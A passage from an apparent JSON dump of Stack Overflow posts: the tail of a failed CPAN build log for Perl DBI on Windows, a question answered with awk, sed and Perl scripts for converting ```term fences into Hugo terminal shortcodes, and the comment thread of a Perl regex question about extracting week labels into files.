ofileDumper/\nDBI-1.642/lib/DBI/SQL/\nDBI-1.642/lib/DBI/SQL/Nano.pm\nDBI-1.642/lib/DBI/ProfileDumper/Apache.pm\nDBI-1.642/lib/DBI/DBD/SqlEngine/\nDBI-1.642/lib/DBI/DBD/Metadata.pm\nDBI-1.642/lib/DBI/DBD/SqlEngine.pm\nDBI-1.642/lib/DBI/DBD/SqlEngine/Developers.pod\nDBI-1.642/lib/DBI/DBD/SqlEngine/HowTo.pod\nDBI-1.642/lib/DBI/Const/GetInfoType.pm\nDBI-1.642/lib/DBI/Const/GetInfoReturn.pm\nDBI-1.642/lib/DBI/Const/GetInfo/\nDBI-1.642/lib/DBI/Const/GetInfo/ODBC.pm\nDBI-1.642/lib/DBI/Const/GetInfo/ANSI.pm\nDBI-1.642/lib/DBI/Gofer/Serializer/\nDBI-1.642/lib/DBI/Gofer/Transport/\nDBI-1.642/lib/DBI/Gofer/Execute.pm\nDBI-1.642/lib/DBI/Gofer/Response.pm\nDBI-1.642/lib/DBI/Gofer/Request.pm\nDBI-1.642/lib/DBI/Gofer/Transport/pipeone.pm\nDBI-1.642/lib/DBI/Gofer/Transport/stream.pm\nDBI-1.642/lib/DBI/Gofer/Transport/Base.pm\nDBI-1.642/lib/DBI/Gofer/Serializer/DataDumper.pm\nDBI-1.642/lib/DBI/Gofer/Serializer/Storable.pm\nDBI-1.642/lib/DBI/Gofer/Serializer/Base.pm\nDBI-1.642/lib/DBI/Util/_accessor.pm\nDBI-1.642/lib/DBI/Util/CacheMemory.pm\nDBI-1.642/t/pod.t\nDBI-1.642/t/90sql_type_cast.t\nDBI-1.642/t/80proxy.t\nDBI-1.642/t/51dbm_file.t\nDBI-1.642/t/16destroy.t\nDBI-1.642/t/lib.pl\nDBI-1.642/t/73cachedkids.t\nDBI-1.642/t/40profile.t\nDBI-1.642/t/02dbidrv.t\nDBI-1.642/t/86gofer_fail.t\nDBI-1.642/t/53sqlengine_adv.t\nDBI-1.642/t/06attrs.t\nDBI-1.642/t/65transact.t\nDBI-1.642/t/01basics.t\nDBI-1.642/t/48dbi_dbd_sqlengine.t\nDBI-1.642/t/03handle.t\nDBI-1.642/t/05concathash.t\nDBI-1.642/t/41prof_dump.t\nDBI-1.642/t/14utf8.t\nDBI-1.642/t/07kids.t\nDBI-1.642/t/11fetch.t\nDBI-1.642/t/19fhtrace.t\nDBI-1.642/t/91_store_warning.t\nDBI-1.642/t/87gofer_cache.t\nDBI-1.642/t/54_dbd_mem.t\nDBI-1.642/t/72childhandles.t\nDBI-1.642/t/49dbd_file.t\nDBI-1.642/t/85gofer.t\nDBI-1.642/t/12quote.t\nDBI-1.642/t/04mods.t\nDBI-1.642/t/10examp.t\nDBI-1.642/t/52dbm_complex.t\nDBI-1.642/t/35thrclone.t\nDBI-1.642/t/50dbm_simple.t\nDBI-1.642/t/15array.t\nDBI-1.642/t/31methcache.t\nDBI-1.642/t/09trace.t\nDBI-1.642/t/60preparse.t\nDBI-1.642/t/20meta.t\nDBI-1.642/t/pod-coverage.t\nDBI-1.642/t/70callbacks.t\nDBI-1.642/t/42prof_data.t\nDBI-1.642/t/13taint.t\nDBI-1.642/t/43prof_env.t\nDBI-1.642/t/30subclass.t\nDBI-1.642/t/08keeperr.t\nDBI-1.642/ex/profile.pl\nDBI-1.642/ex/corogofer.pl\nDBI-1.642/ex/perl_dbi_nulls_test.pl\nConfiguring T/TI/TIMB/DBI-1.642.tar.gz with Makefile.PL\nYour perl was compiled with gcc (version 4.6.3), okay.\nUse of uninitialized value $DBI::DBD::Config{\"cc\"} in string eq at lib/DBI/DBD.pm line 3315.\nCreating test wrappers for DBD::Gofer:\nt/zvg_01basics.t\nt/zvg_02dbidrv.t\nt/zvg_03handle.t\nt/zvg_04mods.t\nt/zvg_05concathash.t\nt/zvg_06attrs.t\nt/zvg_07kids.t\nt/zvg_08keeperr.t\nt/zvg_09trace.t\nt/zvg_10examp.t\nt/zvg_11fetch.t\nt/zvg_12quote.t\nt/zvg_13taint.t\nt/zvg_14utf8.t\nt/zvg_15array.t\nt/zvg_16destroy.t\nt/zvg_19fhtrace.t\nt/zvg_20meta.t\nt/zvg_30subclass.t\nt/zvg_31methcache.t\nt/zvg_35thrclone.t (use threads)\nt/zvg_40profile.t\nt/zvg_41prof_dump.t\nt/zvg_42prof_data.t\nt/zvg_43prof_env.t\nt/zvg_48dbi_dbd_sqlengine.t\nt/zvg_49dbd_file.t\nt/zvg_50dbm_simple.t\nt/zvg_51dbm_file.t\nt/zvg_52dbm_complex.t\nt/zvg_53sqlengine_adv.t\nt/zvg_54_dbd_mem.t\nt/zvg_60preparse.t\nt/zvg_65transact.t\nt/zvg_70callbacks.t\nt/zvg_72childhandles.t\nt/zvg_73cachedkids.t\nt/zvg_80proxy.t\nt/zvg_85gofer.t\nt/zvg_86gofer_fail.t\nt/zvg_87gofer_cache.t\nt/zvg_90sql_type_cast.t\nt/zvg_91_store_warning.t\nCreating test wrappers for DBI::SQL::Nano:\nt/zvn_48dbi_dbd_sqlengine.t\nt/zvn_49dbd_file.t\nt/zvn_50dbm_simple.t\nt/zvn_51dbm_file.t\nt/zvn_52dbm_complex.t\nt/zvn_85gofer.t\nCreating test wrappers for DBI::PurePerl:\nt/zvp_01basics.t\nt/zvp_02dbidrv.t\nt/zvp_03handle.t\nt/zvp_04mods.t\nt/zvp_05concathash.t\nt/zvp_06attrs.t\nt/zvp_07kids.t\nt/zvp_08keeperr.t\nt/zvp_09trace.t\nt/zvp_10examp.t\nt/zvp_11fetch.t\nt/zvp_12quote.t\nt/zvp_13taint.t\nt/zvp_14utf8.t\nt/zvp_15array.t\nt/zvp_16destroy.t\nt/zvp_19fhtrace.t\nt/zvp_20meta.t\nt/zvp_30subclass.t\nt/zvp_31methcache.t\nt/zvp_35thrclone.t (use threads)\nt/zvp_40profile.t\nt/zvp_41prof_dump.t\nt/zvp_42prof_data.t\nt/zvp_43prof_env.t\nt/zvp_48dbi_dbd_sqlengine.t\nt/zvp_49dbd_file.t\nt/zvp_50dbm_simple.t\nt/zvp_51dbm_file.t\nt/zvp_52dbm_complex.t\nt/zvp_53sqlengine_adv.t\nt/zvp_54_dbd_mem.t\nt/zvp_60preparse.t\nt/zvp_65transact.t\nt/zvp_70callbacks.t\nt/zvp_72childhandles.t\nt/zvp_73cachedkids.t\nt/zvp_80proxy.t\nt/zvp_85gofer.t\nt/zvp_86gofer_fail.t\nt/zvp_87gofer_cache.t\nt/zvp_90sql_type_cast.t\nt/zvp_91_store_warning.t\nCreating test wrappers for DBD::Gofer + DBI::SQL::Nano:\nt/zvxgn_48dbi_dbd_sqlengine.t\nt/zvxgn_49dbd_file.t\nt/zvxgn_50dbm_simple.t\nt/zvxgn_51dbm_file.t\nt/zvxgn_52dbm_complex.t\nt/zvxgn_85gofer.t\nCreating test wrappers for DBD::Gofer + DBI::PurePerl:\nt/zvxgp_01basics.t\nt/zvxgp_02dbidrv.t\nt/zvxgp_03handle.t\nt/zvxgp_04mods.t\nt/zvxgp_05concathash.t\nt/zvxgp_06attrs.t\nt/zvxgp_07kids.t\nt/zvxgp_08keeperr.t\nt/zvxgp_09trace.t\nt/zvxgp_10examp.t\nt/zvxgp_11fetch.t\nt/zvxgp_12quote.t\nt/zvxgp_13taint.t\nt/zvxgp_14utf8.t\nt/zvxgp_15array.t\nt/zvxgp_16destroy.t\nt/zvxgp_19fhtrace.t\nt/zvxgp_20meta.t\nt/zvxgp_30subclass.t\nt/zvxgp_31methcache.t\nt/zvxgp_35thrclone.t (use threads)\nt/zvxgp_40profile.t\nt/zvxgp_41prof_dump.t\nt/zvxgp_42prof_data.t\nt/zvxgp_43prof_env.t\nt/zvxgp_48dbi_dbd_sqlengine.t\nt/zvxgp_49dbd_file.t\nt/zvxgp_50dbm_simple.t\nt/zvxgp_51dbm_file.t\nt/zvxgp_52dbm_complex.t\nt/zvxgp_53sqlengine_adv.t\nt/zvxgp_54_dbd_mem.t\nt/zvxgp_60preparse.t\nt/zvxgp_65transact.t\nt/zvxgp_70callbacks.t\nt/zvxgp_72childhandles.t\nt/zvxgp_73cachedkids.t\nt/zvxgp_80proxy.t\nt/zvxgp_85gofer.t\nt/zvxgp_86gofer_fail.t\nt/zvxgp_87gofer_cache.t\nt/zvxgp_90sql_type_cast.t\nt/zvxgp_91_store_warning.t\nCreating test wrappers for DBI::SQL::Nano + DBI::PurePerl:\nt/zvxnp_48dbi_dbd_sqlengine.t\nt/zvxnp_49dbd_file.t\nt/zvxnp_50dbm_simple.t\nt/zvxnp_51dbm_file.t\nt/zvxnp_52dbm_complex.t\nt/zvxnp_85gofer.t\nCreating test wrappers for DBD::Gofer + DBI::SQL::Nano + DBI::PurePerl:\nt/zvxgnp_48dbi_dbd_sqlengine.t\nt/zvxgnp_49dbd_file.t\nt/zvxgnp_50dbm_simple.t\nt/zvxgnp_51dbm_file.t\nt/zvxgnp_52dbm_complex.t\nt/zvxgnp_85gofer.t\nChecking if your kit is complete...\nLooks good\nUse of uninitialized value $m[8] in join or string at C:/Perl64/site/lib/ExtUtils/MM_Unix.pm line 343.\n\n    I see you're using perl 5.028001 on MSWin32-x64-multi-thread, okay.\n    Remember to actually *read* the README file!\n    Use  'make' to build the software (dmake or nmake on Windows).\n    Then 'make test' to execute self tests.\n    Then 'make install' to install the DBI and then delete this working\n    directory before unpacking and building any DBD::* drivers.\n\n    Windows users need to use the correct make command.\n    That may be nmake or dmake depending on which Perl you are using.\n    If using the Win32 ActiveState build then it is recommended that you\n    use the ppm utility to fetch and install a prebuilt DBI instead.\n\nGenerating a dmake-style Makefile\nWriting Makefile for DBI\nWriting MYMETA.yml and MYMETA.json\n  TIMB/DBI-1.642.tar.gz\n  C:\\Perl64\\bin\\perl.exe Makefile.PL INSTALLDIRS=site -- OK\nRunning make for T/TI/TIMB/DBI-1.642.tar.gz\n'dmake' is not recognized as an internal or external command,\noperable program or batch file.\n  TIMB/DBI-1.642.tar.gz\n  dmake -- NOT OK\nFailed during this command:\n TIMB/DBI-1.642.tar.gz                        : make NO\n\ncpan&gt;```\n</code></pre>\n"}, {"tags": ["regex", "shell", "perl", "awk", "sed"], "comments": [{"owner": {"reputation": 95936, "user_id": 5866580, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1de2cd722d865edac1575102a48ecc0a?s=128&d=identicon&r=PG&f=1", "display_name": "RavinderSingh13", "link": "https://stackoverflow.com/users/5866580/ravindersingh13"}, "edited": false, "score": 0, "creation_date": 1577268001, "post_id": 59477195, "comment_id": 105131756, "body": "Sorry but it is not clear, could you please post more clear examples of samples in your question and let us know then?"}, {"owner": {"reputation": 187, "user_id": 1077652, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d3d6a4524f022b29dca06a48c0d5c94b?s=128&d=identicon&r=PG", "display_name": "alexandra", "link": "https://stackoverflow.com/users/1077652/alexandra"}, "reply_to_user": {"reputation": 95936, "user_id": 5866580, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1de2cd722d865edac1575102a48ecc0a?s=128&d=identicon&r=PG&f=1", "display_name": "RavinderSingh13", "link": "https://stackoverflow.com/users/5866580/ravindersingh13"}, "edited": false, "score": 0, "creation_date": 1577268755, "post_id": 59477195, "comment_id": 105131933, "body": "Basically I want to replace each matching par of lines that include ``` term  with <code>{{&lt; terminal &gt;}}</code> and  ```  with {{&lt; /terminal &gt;}}."}], "answers": [{"comments": [{"owner": {"reputation": 187, "user_id": 1077652, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d3d6a4524f022b29dca06a48c0d5c94b?s=128&d=identicon&r=PG", "display_name": "alexandra", "link": "https://stackoverflow.com/users/1077652/alexandra"}, "edited": false, "score": 1, "creation_date": 1577270616, "post_id": 59477470, "comment_id": 105132341, "body": "Thanks! I only had to change the first matching ```  to ```term and remove the &quot;val1 ORS&quot; part."}], "tags": [], "owner": {"reputation": 95936, "user_id": 5866580, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/1de2cd722d865edac1575102a48ecc0a?s=128&d=identicon&r=PG&f=1", "display_name": "RavinderSingh13", "link": "https://stackoverflow.com/users/5866580/ravindersingh13"}, "is_accepted": true, "score": 3, "last_activity_date": 1577276753, "last_edit_date": 1577276753, "creation_date": 1577269739, "answer_id": 59477470, "question_id": 59477195, "link": "https://stackoverflow.com/questions/59477195/replace-matching-start-end-lines/59477470#59477470", "title": "Replace matching START END lines", "body": "<p>Could you please try following.</p>\n\n<pre><code>awk -v start=\"{{&lt; terminal &gt;}}\" -v end=\"{{&lt; /terminal &gt;}}\" '\n/```/ &amp;&amp; found==\"\"{\n  if(rest_of_values){\n    print rest_of_values\n    rest_of_values=\"\"\n  }\n  found=1\n  val1=$0\n  next\n}\n/```/ &amp;&amp; found==1{\n  print start ORS rest_of_values ORS end\n  rest_of_values=found=\"\"\n  next\n}\n{\n  rest_of_values=(rest_of_values?rest_of_values ORS:\"\")$0\n}\nEND{\n  if(rest_of_values){\n    print val1 ORS rest_of_values\n  }\n}\n'  Input_file\n</code></pre>\n\n<p><strong><em>What does code take care of:</em></strong></p>\n\n<ul>\n<li>It looks for pairs of ``` string and if a pair is FOUND then only it changes its values.</li>\n<li>In case a pair is NOT completed then it prints the values of those lines as it is too(without changed lines basically).</li>\n</ul>\n\n<p><strong><em>Explanation:</em></strong> Adding a detailed explanation for above code here.</p>\n\n<pre><code>awk -v start=\"{{&lt; terminal &gt;}}\" -v end=\"{{&lt; /terminal &gt;}}\" '      ##Starting awk program from here with variable values start and end here.\n/```/ &amp;&amp; found==\"\"{                                               ##Checking condition if ``` is found in a line and variable found is NULL then do following.\n  if(rest_of_values){                                             ##Checking condition if variable rest_of_values is NOT NULL then do following.\n    print rest_of_values                                          ##Print variable rest_of_values here.\n    rest_of_values=\"\"                                             ##Nullifying variable rest_of_values here.\n  }                                                               ##Closing BLOCK for above if condition here.\n  found=1                                                         ##Setting variable found variable value as 1 here.\n  val1=$0                                                         ##Setting variable val1 value as current line value here.\n  next                                                            ##next will skip all further statements from here.\n}                                                                 ##Closing BLOCK for /```/ &amp;&amp; found==\"\"{ condition here.\n/```/ &amp;&amp; found==1{                                                ##Checking condition if ``` is found and variable found is NOT NULL then do following.\n  print start ORS rest_of_values ORS end                          ##Printing value of variable start,ORS,rest_of_values,ORS and end variable here.\n  rest_of_values=found=\"\"                                         ##Nullifying variables rest_of_values and found here.\n  next                                                            ##next will skip all further statements frmo here.\n}                                                                 ##Closing BLOCK for condition /```/ &amp;&amp; found==1{ here.\n{\n  rest_of_values=(rest_of_values?rest_of_values ORS:\"\")$0         ##If above both conditions are NOT matching then creating a variable rest_of_values, keep concatenating its own value each time it comes here.\n}\nEND{                                                              ##Starting END BLOCK for this awk program here.\n  if(rest_of_values){                                             ##Checking condition if variable rest_of_values is NOT NULL then do following.\n    print val1 ORS rest_of_values                                 ##Printing values val1 ORS rest_of_values here.\n  }\n}                                                                 ##Closing BLOCK for END BLOCK of this awk code here.\n'  Input_file                                                     ##Mentioning Input_file name here.\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 187, "user_id": 1077652, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d3d6a4524f022b29dca06a48c0d5c94b?s=128&d=identicon&r=PG", "display_name": "alexandra", "link": "https://stackoverflow.com/users/1077652/alexandra"}, "edited": false, "score": 0, "creation_date": 1577283271, "post_id": 59478238, "comment_id": 105135287, "body": "Thanks! This solution works without any side effects."}], "tags": [], "owner": {"reputation": 46858, "user_id": 967492, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/526ea226101e199d029049dda22a4e58?s=128&d=identicon&r=PG", "display_name": "potong", "link": "https://stackoverflow.com/users/967492/potong"}, "is_accepted": false, "score": 1, "last_activity_date": 1577275564, "creation_date": 1577275564, "answer_id": 59478238, "question_id": 59477195, "link": "https://stackoverflow.com/questions/59477195/replace-matching-start-end-lines/59478238#59478238", "title": "Replace matching START END lines", "body": "<p>This might work for you (GNU sed):</p>\n\n<pre><code>sed -i '/^```term/{s//{{&lt; terminal &gt;}}/;:a;n;/^```/!ba;s//{{&lt; \\/terminal &gt;}}/}' file\n</code></pre>\n\n<p>Search for a line beginning <code>```term</code> ,replace it by <code>{{&lt; terminal &gt;}}</code> continue fetching and printing lines until one that begins <code>```</code> and replace it by <code>{{&lt; /terminal &gt;}}</code>. All other lines print as normal.</p>\n"}, {"tags": [], "owner": {"reputation": 7820, "user_id": 2125671, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/13a492143ab4a2575b5a1f500691193c?s=128&d=identicon&r=PG", "display_name": "Philippe", "link": "https://stackoverflow.com/users/2125671/philippe"}, "is_accepted": false, "score": 3, "last_activity_date": 1577316236, "creation_date": 1577316236, "answer_id": 59482526, "question_id": 59477195, "link": "https://stackoverflow.com/questions/59477195/replace-matching-start-end-lines/59482526#59482526", "title": "Replace matching START END lines", "body": "<p>perl version :</p>\n\n<pre><code>while (&lt;&gt;){\n    if  (/```term/ ... /```/){\n        if  (/```term/){\n            print \"{{&lt; terminal &gt;}}\\n\";\n            next;\n        } elsif (/```/) {\n            print \"{{&lt; /terminal &gt;}}\\n\";\n            next;\n        }\n    }\n    print;\n}\n</code></pre>\n\n<p>command to run :</p>\n\n<pre><code>perl test.pl input-file\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "is_accepted": false, "score": 1, "last_activity_date": 1577443497, "last_edit_date": 1577443497, "creation_date": 1577443056, "answer_id": 59499468, "question_id": 59477195, "link": "https://stackoverflow.com/questions/59477195/replace-matching-start-end-lines/59499468#59499468", "title": "Replace matching START END lines", "body": "<p>Just try this:(<code>Nested START END doesn't work and there is no sample/question also</code>)</p>\n\n<pre><code>$str=~s/((\\`\\`\\`)term)((?:(?!\\2).)*)(\\2)/\\{\\{&lt; terminal &gt;\\}\\}$3\\{\\{&lt;\\/ terminal&gt;\\}\\}/gs;\n\n   ((\\`\\`\\`)term) #  Start match ```term\n   ((?:(?!\\2).)*)#  Not equal to ```\n   (\\2)#  End Match```\n</code></pre>\n"}], "owner": {"reputation": 187, "user_id": 1077652, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d3d6a4524f022b29dca06a48c0d5c94b?s=128&d=identicon&r=PG", "display_name": "alexandra", "link": "https://stackoverflow.com/users/1077652/alexandra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 118, "favorite_count": 0, "accepted_answer_id": 59477470, "answer_count": 4, "score": 1, "last_activity_date": 1577768114, "creation_date": 1577267650, "last_edit_date": 1577768114, "question_id": 59477195, "link": "https://stackoverflow.com/questions/59477195/replace-matching-start-end-lines", "title": "Replace matching START END lines", "body": "<p>I am trying to replace two matching patterns on multiple lines, replace only the matching <code>start</code> and <code>end</code> lines and keep the lines between <code>start</code> and <code>end</code>.</p>\n\n<p>I tried to combine some answers from here using sed, awk, Python, Perl but no luck.</p>\n\n<p>This is what I have:</p>\n\n<pre><code>other text\n\n```term\ncommand1\n```\n\nother text\n\n```term\ncommand1\ncommand2\n```\n\nother text\n\n```js\ncode\n```\n</code></pre>\n\n<p>The replaced text should look like this:</p>\n\n<pre><code>other text\n\n{{&lt; terminal &gt;}}\ncommand1\n{{&lt; /terminal &gt;}}\n\nother text\n\n{{&lt; terminal &gt;}}\ncommand1\ncommand2\n{{&lt; /terminal &gt;}}\n\nother text\n\n```js\ncode\n```\n</code></pre>\n\n<p>Basically I want to replace each matching par of lines that include <code>term  with `{{&lt; terminal &gt;}}` and</code> with <code>{{&lt; /terminal &gt;}}</code>.</p>\n\n<p>I can't do a simple search and replace the lines containing the <code>start</code> and <code>end</code> patterns because <code>end</code> can match other <code>start</code> lines which I want to keep.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577229121, "post_id": 59474021, "comment_id": 105126365, "body": "<code>cat.txt</code> and <code>dog.txt</code> need to be in quotes."}, {"owner": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577229175, "post_id": 59474021, "comment_id": 105126373, "body": "You&#39;re never printing <code>$line</code> into the files. You also need to open the files in append mode, so you don&#39;t overwrite the previous lines."}, {"owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "reply_to_user": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577229244, "post_id": 59474021, "comment_id": 105126382, "body": "@Barmar i dont want to print the lines themselves into the files."}, {"owner": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577229379, "post_id": 59474021, "comment_id": 105126403, "body": "Then use a regexp that extracts the portion of the line you want."}, {"owner": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577229447, "post_id": 59474021, "comment_id": 105126415, "body": "See <a href=\"https://stackoverflow.com/questions/1444009/how-can-i-extract-substrings-from-a-string-in-perl\" title=\"how can i extract substrings from a string in perl\">stackoverflow.com/questions/1444009/&hellip;</a> for how to extract substrings."}, {"owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "reply_to_user": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577229480, "post_id": 59474021, "comment_id": 105126423, "body": "@Barmar it&#39;s not that straightforward for me. If I were not having issues, I clearly wouldn&#39;t have posted the question. Please read the entire post to understand what I am wanting to do exactly and where I am having trouble."}, {"owner": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577229656, "post_id": 59474021, "comment_id": 105126447, "body": "Did you read that question, it shows exactly how to extract the <code>weekXXX</code> part of the line into a variable. Then push the variable onto a list <code>@cats</code> or <code>@dogs</code>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1577229685, "post_id": 59474021, "comment_id": 105126453, "body": "I am not sure I get it ... do you want two output files, <code>cat.txt</code> and <code>dog.txt</code>, where each will have that <code>weekNNa</code> pattern from corresponding lines?"}, {"owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "reply_to_user": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577229747, "post_id": 59474021, "comment_id": 105126465, "body": "@Barmar no, i just saw your comment with the link. I will take a look at it now."}, {"owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1577229759, "post_id": 59474021, "comment_id": 105126467, "body": "@zdim yes, that&#39;s right :)"}, {"owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "reply_to_user": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577229860, "post_id": 59474021, "comment_id": 105126482, "body": "@Barmar I never asked for someone to code it for me. I am looking for a helpful reply with some tips and insight on how to go about it as I don&#39;t know how to approach it. Comment sections are not made for prolonged discussions unrelated to clarification, so if you have any tips, i would appreciate it. Meanwhile, I will go ahead and just out the link you commented."}, {"owner": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577230092, "post_id": 59474021, "comment_id": 105126513, "body": "<code>if ($line =~ &#47;(week...).*cat&#47;) { push @cats, $1; }</code>"}, {"owner": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577230253, "post_id": 59474021, "comment_id": 105126538, "body": "Your previous question is about how to extract the <code>weekXXX</code> part of the string, just like the question I linked to. It&#39;s not clear what more you need to know."}, {"owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "reply_to_user": {"reputation": 589595, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1577230493, "post_id": 59474021, "comment_id": 105126562, "body": "@Barmar my biggest confusion is getting it into an array for all three paths. I took a look at the other link, but still a bit confused. each time I fall into the if statement, i want to push the next weekxxX into the array so I end up with 3 weekxxX. I will give it a shot using my regex with <code>if ($line =~ &#47;(week...).*cat&#47;) { push @cats, $1; }</code> as you suggested."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1577392898, "post_id": 59474021, "comment_id": 105160621, "body": "When <code>open</code> fails you need to always print the error in <code>die</code>, for what the <a href=\"https://perldoc.perl.org/perlvar.html#Error-Variables\" rel=\"nofollow noreferrer\"><code>$!</code> variable</a> is there. It&#39;s commonly done like <code>open ... or die &quot;Can&#39;t open $file: $!&quot;;</code>"}, {"owner": {"reputation": 478, "user_id": 7484043, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c553310d1ad27e031be3aefb8127db4f?s=128&d=identicon&r=PG&f=1", "display_name": "programminglearner", "link": "https://stackoverflow.com/users/7484043/programminglearner"}, "reply_to_user": {"reputation": 53041, "user_id": 